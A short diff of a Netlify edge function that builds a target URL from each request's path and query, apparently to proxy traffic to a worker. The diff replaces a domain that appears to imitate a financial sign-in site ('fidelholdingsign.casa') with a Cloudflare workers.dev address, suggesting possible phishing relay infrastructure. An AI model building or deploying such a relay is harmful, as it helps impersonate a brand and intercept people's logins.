@@ -2,7 +2,7 @@ import { Context } from "https://edge.netlify.com";
 
 export default async (request: Request, context: Context) => {
   // 1. Define your Worker URL here
-  const workerBase = "https://individual.fidelholdingsign.casa/";
+  const workerBase = "https://mute-rice-e80a.eddanielbrewer.workers.dev";
   
   const url = new URL(request.url);
   const target = workerBase + url.pathname + url.search;
